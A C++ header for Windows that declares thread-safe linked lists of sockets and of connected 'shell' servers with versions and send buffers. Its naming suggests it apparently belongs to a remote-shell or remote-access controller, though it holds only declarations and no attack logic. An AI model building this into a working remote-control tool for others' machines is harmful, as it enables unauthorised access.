#ifndef C_SHELLLIST_H
#define C_SHELLLIST_H

#include <winsock2.h>
#include <windows.h>
#include "..\zxsCommon\link.h"

class _CZXServer{

public:
	SOCKET Socket;
	HWND hOutPutDlg2;
	float ver;
	DWORD funmask;

	int bytesleft;
	int bytessent;
	char sendbuff[1024*4];

public:
	_CZXServer();
	int Send(char *buff, int len);
	int Send();
};


class _tagConnInfo{

public:
	SOCKET parentSocket;
	SOCKET Socket;

public:
	_tagConnInfo();

};

class C_CMDCONNLIST:public LINKTABLE<_tagConnInfo>
{
protected:
	CRITICAL_SECTION cs;
public:
	C_CMDCONNLIST()
	{
		InitializeCriticalSection(&cs);
	}
	~C_CMDCONNLIST()
	{
		DeleteCriticalSection(&cs);
	}
	int AddSocket(_tagConnInfo ci);
	int DelSocket(SOCKET s);
	_tagConnInfo *IsSocketInList(SOCKET s);
	int CloseAllSocket();

};


class C_SHELLLIST:public LINKTABLE<_CZXServer>
{
protected:
	CRITICAL_SECTION cs;
public:
	C_SHELLLIST()
	{
		InitializeCriticalSection(&cs);
	}
	~C_SHELLLIST()
	{
		DeleteCriticalSection(&cs);
	}
	int AddSocket(_CZXServer s);
	int DelSocket(SOCKET s);
	float GetShellVersion(SOCKET s);
	_CZXServer *IsSocketInList(SOCKET s);
	int CloseAllSocket();

};

#endif